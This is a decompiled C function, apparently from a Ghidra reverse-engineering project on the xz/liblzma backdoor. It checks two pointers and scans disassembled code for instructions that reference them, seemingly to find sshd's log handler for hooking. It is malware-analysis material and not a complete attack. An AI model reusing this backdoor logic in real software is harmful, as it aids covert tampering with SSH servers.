// /home/kali/xzre-ghidra/xzregh/102B10_validate_log_handler_pointers.c
// Function: validate_log_handler_pointers @ 0x102B10
// Calling convention: __stdcall
// Prototype: BOOL __stdcall validate_log_handler_pointers(void * addr1, void * addr2, void * search_base, u8 * code_end, string_references_t * refs, global_context_t * global)


BOOL validate_log_handler_pointers
               (void *addr1,void *addr2,void *search_base,u8 *code_end,string_references_t *refs,
               global_context_t *global)

{
  void *mem_address;
  BOOL BVar1;
  long lVar2;
  u8 *puVar3;
  u8 **ppuVar4;
  u8 *code_end_00;
  u8 *local_88;
  u8 *local_80;
  u64 local_78;
  int local_58;
  u64 local_48;
  
  ppuVar4 = &local_80;
  for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
    *(undefined4 *)ppuVar4 = 0;
    ppuVar4 = (u8 **)((long)ppuVar4 + 4);
  }
  if ((addr1 != addr2 && addr1 != (void *)0x0) && (addr2 != (void *)0x0)) {
    lVar2 = (long)addr2 - (long)addr1;
    if (addr2 <= addr1) {
      lVar2 = (long)addr1 - (long)addr2;
    }
    if (((lVar2 < 0x10) &&
        (mem_address = refs->entries[0x13].func_start, mem_address != (void *)0x0)) &&
       (puVar3 = (u8 *)refs->entries[0x14].func_start, puVar3 != (u8 *)0x0)) {
      code_end_00 = (u8 *)refs->entries[0x14].func_end;
      BVar1 = find_lea_instruction_with_mem_operand
                        (puVar3,code_end_00,(dasm_ctx_t *)&local_80,mem_address);
      puVar3 = local_80;
      if (BVar1 != 0) {
        BVar1 = x86_dasm((dasm_ctx_t *)&local_80,local_80 + local_78,code_end_00);
        if ((BVar1 != 0) && (local_58 == 0x168)) {
          local_88 = (u8 *)0x0;
          puVar3 = local_80 + local_78 + local_48;
          find_function(puVar3,(void **)0x0,&local_88,(u8 *)search_base,code_end,
                        global->uses_endbr64);
          code_end_00 = local_88;
        }
        BVar1 = find_instruction_with_mem_operand_ex
                          (puVar3,code_end_00,(dasm_ctx_t *)0x0,0x109,addr1);
        if (BVar1 != 0) {
          BVar1 = find_instruction_with_mem_operand_ex
                            (puVar3,code_end_00,(dasm_ctx_t *)0x0,0x109,addr2);
          return (uint)(BVar1 != 0);
        }
      }
    }
  }
  return 0;
}

